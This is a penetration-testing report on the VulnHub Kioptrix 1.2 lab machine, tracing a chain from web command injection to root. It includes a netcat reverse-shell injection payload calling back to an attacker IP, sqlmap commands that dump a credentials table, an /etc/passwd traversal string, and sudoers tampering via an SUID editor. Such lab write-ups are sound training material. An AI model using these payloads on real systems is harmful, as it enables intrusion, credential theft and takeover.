# 🔐 Penetration Testing Report Kioptrix 1.2


---

## 1. 📋 General Information

|Parameter|Value|
|---|---|
|Target System|Kioptrix 1.2|
|Platform|VulnHub|
|Target IP|`192.168.96.19`|
|Lab Network|`192.168.96.0/24`|
|Attacker System|Kali Linux|
|Testing Type|Black-box|
|Objective|Obtain initial access and root privileges|
|Final Result|Full system compromise|

The assessment was conducted in an isolated VulnHub laboratory environment.

The **primary compromise path** was achieved through a web application vulnerability that allowed arbitrary command execution and resulted in a reverse shell running as `www-data`.

After obtaining initial access, application configuration files were enumerated and database credentials were discovered. These credentials provided access to the MySQL database, where the `dev_accounts` table contained password hashes for application users.

The password hash belonging to `loneferret` was recovered using John the Ripper. The recovered credentials were then used to obtain SSH access as `loneferret`.

During local privilege escalation enumeration, an SUID-enabled `ht` binary was discovered. This binary allowed modification of `/etc/sudoers`, which ultimately resulted in root-level access.

In addition to the primary exploitation path, several other potential attack vectors were identified, including SQL Injection, LFI, LotusCMS exploitation, directory listing, outdated software, and insecure SSH configuration.

> ⚠️ **Important:** The additional vulnerabilities described in this report were identified during the assessment for completeness and demonstrate the breadth of the security assessment. They were **not part of the primary attack chain used to obtain root access**.

---

# 2. 🎯 Executive Summary

The security assessment of Kioptrix 1.2 demonstrated that the target system could be **fully compromised by an unauthenticated remote attacker**.

The actual exploitation chain was:

**Attacker → Web Application → Command Execution → Reverse Shell → `www-data`**

After obtaining a shell as `www-data`, local enumeration revealed the application configuration file:

```text
/home/www/kioptrix3.com/gallery/gconfig.php
```

The configuration contained credentials for the MySQL database.

Access to the `gallery` database revealed the `dev_accounts` table containing user credentials. The password hash associated with `loneferret` was extracted and subsequently cracked using John the Ripper.

The recovered credentials provided SSH access:

**`www-data` → `loneferret` via SSH**

Further local enumeration identified an SUID-enabled `ht` binary. This was correlated with a `readme` file found in the user's home directory, which specifically referenced the use of `ht`.

The `ht` binary was subsequently used to modify `/etc/sudoers`. This allowed the following command to be executed:

```bash
sudo bash
```

The result was a root shell.

### 💥 Final Result

**Full compromise of the Kioptrix 1.2 system with root privileges.**

---

# 3. 🛠️ Tools Used

The following tools were used during the assessment:

|Tool|Purpose|
|---|---|
|`arp-scan`|Host discovery|
|`Nmap`|Port scanning and service enumeration|
|`Gobuster`|Web directory enumeration|
|`Dirb`|Additional web resource enumeration|
|`WhatWeb`|Technology fingerprinting|
|`SQLMap`|SQL Injection testing and exploitation|
|`Netcat`|Reverse shell|
|`MySQL client`|Database access|
|`John the Ripper`|Password hash cracking|
|`SSH`|Remote system access|
|Linux utilities|Local enumeration and privilege escalation|

---

# 4. 🔎 Reconnaissance

## 4.1. Host Discovery

The local laboratory network was scanned using `arp-scan`:

```bash
sudo arp-scan -I eth1 192.168.96.0/24
```

The target host was identified at:

```text
192.168.96.19
```

This IP address was confirmed as the Kioptrix 1.2 target.

---

# 5. 🌐 Port Scanning

A full TCP port scan with service and operating system detection was performed:

```bash
nmap -sV -A -p- 192.168.96.19
```

The following services were identified:

|Port|Service|Version|
|--:|---|---|
|22/tcp|SSH|OpenSSH 4.7p1|
|80/tcp|HTTP|Apache 2.2.8 / PHP 5.2.4|

The operating system was identified as Linux running a kernel from the 2.6.x family.

---

## 5.1. 🔑 SSH Enumeration

TCP/22 exposed:

```text
OpenSSH 4.7p1 Debian 8ubuntu1.2
```

Further enumeration identified several outdated cryptographic algorithms and parameters, including:

- `ssh-dss`
    
- `ssh-rsa`
    
- `diffie-hellman-group1-sha1`
    
- CBC-based ciphers
    
- outdated MAC algorithms
    

These SSH weaknesses were **not used as part of the primary compromise path**.

However, they represent additional security risks and should be addressed through SSH hardening and software upgrades.

---

# 6. 🕸️ Web Application Analysis

TCP/80 exposed the following web stack:

```text
Apache/2.2.8 (Ubuntu)
PHP/5.2.4-2ubuntu5.6
```

The application title was:

```text
Ligoat Security - Got Goat? Security ...
```

PHP session management was also identified:

```text
PHPSESSID
```

The session cookie did not include the `HttpOnly` attribute.

---

# 7. 📂 Web Resource Enumeration

Gobuster and Dirb were used to identify hidden directories and application resources.

The following paths were discovered:

```text
/cache/
/core/
/gallery/
/modules/
/phpmyadmin/
/style/
/data
/server-status
```

Additional resources included:

```text
/gallery/photos/
/gallery/themes/
/core/controller/
/core/lib/
/core/model/
/core/view/
```

An administrative resource associated with the Gallarific application was also identified.

Several directories exposed directory listings, increasing the amount of information available to a potential attacker.

---

# 8. 🧩 Attack Surface Analysis

During application analysis, multiple potential attack vectors were identified.

### 🔍 Identified attack vectors

1. **Arbitrary command execution leading to a reverse shell**
    
2. **Local File Inclusion through the `system` parameter**
    
3. **SQL Injection in Gallarific**
    
4. **Potential LotusCMS 3.0 exploitation**
    
5. **Directory Listing**
    
6. **Outdated Apache and PHP versions**
    
7. **Weak and outdated SSH algorithms**
    

These findings demonstrate that the target had multiple weaknesses that could potentially be chained together.

However, the **actual compromise path used during the assessment** was:

> **Command Execution → Reverse Shell → `www-data` → Application Configuration → MySQL → `loneferret` → SSH → SUID `ht` → Root**

---

# 9. 💻 Initial Access

## 9.1. Arbitrary Command Execution / Reverse Shell

During analysis of the web application's parameters, an injection point was identified that allowed system commands to be executed.

The payload used was:

```text
index');${system('nc -e /bin/sh 192.168.96.3 4444)};#py
```

URL-encoded representation:

```text
index%27%29%3B%24%7Bsystem%28%27nc%20-e%20%2Fbin%2Fsh%20192.168.96.3%204444%27%29%7D%3B%23py
```

The payload caused the target server to execute Netcat and initiate an outbound connection to the attacker's machine.

A reverse shell was successfully established.

The shell was running with the following privileges:

```text
www-data
```

### 🚨 Severity

**Critical**

**CVSS v3.1: 9.8**

```text
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
```

The vulnerability allows an unauthenticated remote attacker to execute arbitrary operating system commands on the target server.

---

# 10. 🔬 Local Enumeration

After obtaining the reverse shell as `www-data`, local enumeration was performed.

No immediate privilege escalation vector was identified during the initial checks.

Further enumeration therefore focused on:

- application configuration files;
    
- credentials;
    
- user directories;
    
- database configuration;
    
- SUID binaries;
    
- files containing sensitive information;
    
- potential paths for lateral movement between local accounts.
    

This approach eventually revealed credentials that allowed movement from the web service account to a regular system user.

---

# 11. 📝 User Home Directory Analysis

During analysis of files associated with the `loneferret` account, a `readme` file was discovered.

The file contained the following information:

```text
Hello new employee,

It is company policy here to use our newly installed software for editing, creating and viewing files.

Please use the command 'sudo ht'.

Failure to do so will result in you immediate termination.

DG
CEO
```

The reference to `ht` was significant because it suggested that this application was intended to be used with elevated privileges.

This information became particularly valuable during the subsequent SUID enumeration phase.

---

# 12. 🔐 Configuration File Discovery

A search for configuration files was performed:

```bash
find / -name "*config*" 2>/dev/null
```

The following file was identified:

```text
/home/www/kioptrix3.com/gallery/gconfig.php
```

Analysis of the file revealed application configuration parameters, including credentials used to connect to the MySQL database.

This provided a path from the compromised web service account to the backend database.

---

# 13. 🗄️ MySQL Access

Using the credentials discovered in the application configuration, access to MySQL was obtained.

The available databases were enumerated:

```sql
show databases;
```

The following databases were identified:

```text
gallery
information_schema
mysql
```

The `gallery` database was selected:

```sql
use gallery;
```

The tables were then enumerated:

```sql
show tables;
```

Among the discovered tables was:

```text
dev_accounts
```

This table was particularly interesting because it contained account information.

---

# 14. 👤 Credential Extraction

The contents of `dev_accounts` were queried:

```sql
select * from dev_accounts;
```

The following accounts were identified:

```text
loneferret
dreg
```

Password hashes were stored for these users.

The hash associated with `loneferret` was selected for further analysis.

---

# 15. 🔓 Password Recovery

The extracted password hash was processed using John the Ripper.

The password for the `loneferret` account was successfully recovered.

The recovered credentials were then used to obtain direct SSH access to the target.

This represented an important transition in the attack chain:

**`www-data` → Database Credentials → Password Hash → Password Recovery → `loneferret`**

---

# 16. 🔑 SSH Access

The recovered credentials were used to authenticate over SSH:

```text
loneferret@192.168.96.19
```

The attacker therefore transitioned from the restricted web service account:

```text
www-data
```

to the local user:

```text
loneferret
```

SSH access provided a more stable interactive shell and expanded the available options for local privilege escalation.

---

# 17. ⚙️ SUID Enumeration

A search for SUID-enabled binaries was performed:

```bash
find / -perm -4000 2>/dev/null
```

The enumeration revealed:

```text
ht
```

The discovery was particularly significant because the previously discovered `readme` file explicitly referenced the use of `ht`.

This established a clear relationship between:

**User Hint → `ht` → SUID Enumeration → Privilege Escalation**

---

# 18. ⬆️ Exploitation of `ht`

Before launching the application, the terminal environment was configured:

```bash
export TERM=xterm
```

The application was then executed:

```bash
ht
```

The functionality of the SUID-enabled application allowed modification of the system's sudo configuration:

```text
/etc/sudoers
```

A rule was added that granted `loneferret` the ability to execute `/bin/bash` with elevated privileges.

After modifying the sudo configuration, the following command was executed:

```bash
sudo bash
```

This resulted in a root shell.

---

# 19. 👑 Root Access

The current user was verified as:

```text
root
```

Full administrative control over the target operating system was therefore obtained.

The final flag was located under:

```text
/root
```

The flag contents are intentionally omitted from this report.

### 💥 Final Impact

The target system was successfully compromised from an unauthenticated remote position and escalated to full root-level access.

---

# 20. 🔗 Primary Attack Chain

The actual exploitation path used to solve the machine can be summarized as follows:

```text
192.168.96.19
        │
        ▼
     TCP/80
        │
        ▼
 Web Application
        │
        ▼
Command Execution
        │
        ▼
 Reverse Shell
        │
        ▼
   www-data
        │
        ▼
  gconfig.php
        │
        ▼
MySQL Credentials
        │
        ▼
 Database: gallery
        │
        ▼
 dev_accounts
        │
        ▼
 Password Hash
        │
        ▼
John the Ripper
        │
        ▼
   loneferret
        │
        ▼
      SSH
        │
        ▼
 SUID Enumeration
        │
        ▼
       ht
        │
        ▼
  /etc/sudoers
        │
        ▼
   sudo bash
        │
        ▼
      ROOT
```

### 🎯 Attack Path Summary

**Remote Code Execution**

⬇️

**Reverse Shell as `www-data`**

⬇️

**Database Credential Discovery**

⬇️

**Credential Extraction**

⬇️

**Password Cracking**

⬇️

**SSH Access as `loneferret`**

⬇️

**SUID Enumeration**

⬇️

**`ht` Privilege Escalation**

⬇️

**Root Access**

---

# 21. 🔎 Additional Findings

The following vulnerabilities were identified during the assessment but were **not used as part of the primary attack chain**.

These findings are included to document the broader attack surface of the target and demonstrate the additional enumeration and vulnerability research performed during the assessment.

---

## 21.1. 💉 SQL Injection in Gallarific

The source code of `/gallery/index.php` contained a reference to an administrative Gallarific resource:

```html
<a href="gadmin">Admin</a>
```

Further investigation identified a potentially injectable parameter in:

```text
/gallery/gallery.php?id=
```

SQLMap was used to validate the SQL Injection:

```bash
sqlmap -u "http://kioptrix3.com/gallery/gallery.php?id=null" --dbs --level=3 --risk=3
```

The following databases were identified:

```text
gallery
information_schema
mysql
```

The `gallery` database was subsequently enumerated:

```bash
sqlmap -u "http://kioptrix3.com/gallery/gallery.php?id=1" --dbs -D gallery --tables
```

The following tables were identified:

```text
dev_accounts
gallarific_comments
gallarific_galleries
gallarific_photos
gallarific_settings
gallarific_stats
gallarific_users
```

The `dev_accounts` table was selected for further investigation.

Its contents were extracted using:

```bash
sqlmap -u "http://kioptrix3.com/gallery/gallery.php?id=1" --dbs -D gallery -T dev_accounts --dump
```

The SQL Injection allowed extraction of password hashes belonging to application users.

### 🚨 Severity

**High**

**CVSS v3.1: 7.5**

```text
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
```

> ℹ️ **Note:** This vulnerability was confirmed during the assessment but was **not used as the primary route to compromise the machine**.

---

# 22. 📄 Local File Inclusion (LFI)

During analysis of the web application's parameters, a potential Local File Inclusion vulnerability was identified through the `system` parameter.

Example:

```text
/index.php?system=../../../../../etc/passwd%00
```

The vulnerability allowed local files to be requested through path traversal.

This vector was investigated as an alternative attack path but was **not used as the primary route to obtain root access**.

---

# 23. 🧩 LotusCMS 3.0

The application stack also indicated the presence of LotusCMS functionality.

A potential LotusCMS 3.0 arbitrary code execution vector was identified during vulnerability research.

This provided another possible route to initial access.

However, this exploitation path was not used in the final attack chain.

The actual compromise was performed through the previously described command execution vulnerability resulting in a reverse shell as `www-data`.

---

# 24. 📂 Directory Listing

Directory listing was enabled for several web directories.

Examples included:

```text
/icons/
/modules/
/gallery/photos/
/gallery/themes/
```

Directory listing can expose:

- application structure;
    
- filenames;
    
- modules;
    
- uploaded files;
    
- additional application endpoints;
    
- information useful for vulnerability discovery.
    

### ⚠️ Severity

**Low / Medium**

**CVSS v3.1: 5.3**

```text
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N
```

---

# 25. 🍪 Missing `HttpOnly` Cookie Attribute

The PHP session cookie:

```text
PHPSESSID
```

was not configured with the `HttpOnly` attribute.

As a result, client-side JavaScript could potentially access the session cookie in the event of a successful XSS attack.

### ⚠️ Severity

**Low**

**CVSS v3.1: 4.3**

```text
CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:N/A:N
```

---

# 26. 🕰️ Outdated Software

The target was running significantly outdated software versions:

```text
Apache 2.2.8
PHP 5.2.4
OpenSSH 4.7p1
```

Several outdated SSH cryptographic algorithms were also supported.

Running unsupported software increases the attack surface and makes the system significantly harder to secure.

No specific CVSS score is assigned to this finding because CVSS should be calculated against a specific confirmed vulnerability or CVE rather than simply the fact that a software version is outdated.

---

# 27. ⚙️ SUID `ht` Privilege Escalation

The SUID-enabled `ht` binary allowed a local user to modify the system's sudo configuration.

This resulted in the ability to execute:

```bash
sudo bash
```

and obtain root privileges.

### 🚨 Severity

**High**

**CVSS v3.1: 7.8**

```text
CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
```

> 🔗 This vulnerability formed part of the **actual privilege escalation path** used to complete the machine.

---

# 28. 📊 Risk Assessment

|ID|Finding|Severity|CVSS|
|---|---|---|--:|
|VULN-01|Arbitrary command execution through the web application|🔴 Critical|**9.8**|
|VULN-02|SQL Injection in Gallarific|🟠 High|**7.5**|
|VULN-03|SUID `ht` privilege escalation|🟠 High|**7.8**|
|VULN-04|Directory Listing|🟡 Medium|**5.3**|
|VULN-05|Missing `HttpOnly` attribute|🟢 Low|**4.3**|
|VULN-06|Outdated software and SSH configuration|ℹ️ Informational / Medium|—|

### 🔥 Critical Attack Chain

The most significant risk comes from chaining multiple weaknesses:

**VULN-01 → `www-data` → exposed application credentials → database → password hash → `loneferret` → VULN-03 → root**

This demonstrates that vulnerabilities which may appear manageable in isolation can result in **complete system compromise when chained together**.

---

# 29. 🛡️ Recommendations

## 29.1. 🌐 Web Application

- Remove arbitrary command execution functionality.
    
- Properly validate and sanitize all user-controlled parameters.
    
- Never pass untrusted input directly to `eval()`, `system()`, or similar functions.
    
- Implement strict server-side input validation.
    
- Upgrade PHP and the application framework to supported versions.
    

## 29.2. 💉 SQL Injection

- Use parameterized queries and prepared statements.
    
- Never concatenate user-controlled input directly into SQL queries.
    
- Implement server-side input validation.
    
- Apply the principle of least privilege to the application's MySQL account.
    

## 29.3. 🔐 Credentials

- Do not store database passwords in publicly accessible application files.
    
- Use secure secret-management mechanisms.
    
- Store passwords using modern password hashing algorithms.
    
- Restrict access to configuration files.
    
- Rotate credentials after compromise.
    

## 29.4. ⚙️ SUID Configuration

- Audit all SUID/SGID binaries.
    
- Remove SUID from applications that do not require it.
    
- Do not allow unprivileged users to modify `/etc/sudoers`.
    
- Apply the principle of least privilege.
    
- Review all sudo rules regularly.
    

## 29.5. 🔑 SSH

Disable outdated cryptographic algorithms, including:

- `ssh-dss`;
    
- `diffie-hellman-group1-sha1`;
    
- outdated CBC ciphers;
    
- outdated MAC algorithms.
    

Use modern SSH cryptographic algorithms and upgrade OpenSSH to a supported version.

## 29.6. 🕸️ Web Server

- Disable Directory Listing.
    
- Remove unnecessary files and directories.
    
- Restrict access to administrative interfaces.
    
- Configure `HttpOnly` and `Secure` attributes for session cookies.
    
- Upgrade Apache and PHP to supported versions.
    

---

# 30. 🧠 Lessons Learned

The assessment demonstrated the importance of performing systematic enumeration instead of stopping after obtaining an initial shell.

Obtaining access as `www-data` did not immediately provide a direct privilege escalation path. Instead, further local enumeration revealed an application configuration file containing database credentials.

Those credentials provided access to MySQL, where password hashes were discovered.

The recovered password enabled SSH access as `loneferret`.

The next stage demonstrated the importance of correlating information gathered during different phases of the assessment.

The `readme` file contained a reference to `ht`, while SUID enumeration independently confirmed that `ht` was available with elevated privileges.

This ultimately provided the final privilege escalation path.

### 🔗 The complete attack demonstrates a typical multi-stage compromise:

**Web Application**

⬇️

**Command Execution**

⬇️

**Reverse Shell**

⬇️

**Credential Discovery**

⬇️

**Database Access**

⬇️

**Password Recovery**

⬇️

**User Access**

⬇️

**Local Enumeration**

⬇️

**SUID Privilege Escalation**

⬇️

**Root**

The assessment therefore demonstrates that successful penetration testing is not necessarily based on exploiting a single vulnerability. In many real-world scenarios, the attacker must identify and chain multiple weaknesses to achieve full system compromise.

---

# 31. 🏁 Conclusion

The Kioptrix 1.2 system was successfully compromised from an unauthenticated remote position.

The **actual attack path used during the assessment** was:

```text
Command Execution
        ↓
Reverse Shell
        ↓
www-data
        ↓
gconfig.php
        ↓
MySQL Credentials
        ↓
dev_accounts
        ↓
Password Hash
        ↓
John the Ripper
        ↓
loneferret
        ↓
SSH
        ↓
SUID ht
        ↓
/etc/sudoers
        ↓
sudo bash
        ↓
ROOT
```

Additional vulnerabilities were also identified, including:

- SQL Injection;
    
- Local File Inclusion;
    
- potential LotusCMS 3.0 exploitation;
    
- Directory Listing;
    
- missing `HttpOnly`;
    
- outdated Apache/PHP/OpenSSH versions;
    
- weak SSH cryptographic algorithms.
    

These additional findings were documented separately to provide a complete overview of the target's attack surface and were **not presented as alternative solutions to the machine**.

### 💀 Final Assessment Result

**Initial Access:** ✅ Successful  
**Credential Discovery:** ✅ Successful  
**User Compromise:** ✅ `loneferret`  
**SSH Access:** ✅ Successful  
**Privilege Escalation:** ✅ Successful  
**Root Access:** ✅ Successful  
**System Compromise:** 🔴 **Complete**

**Final Result: Full compromise of Kioptrix 1.2 with root privileges.**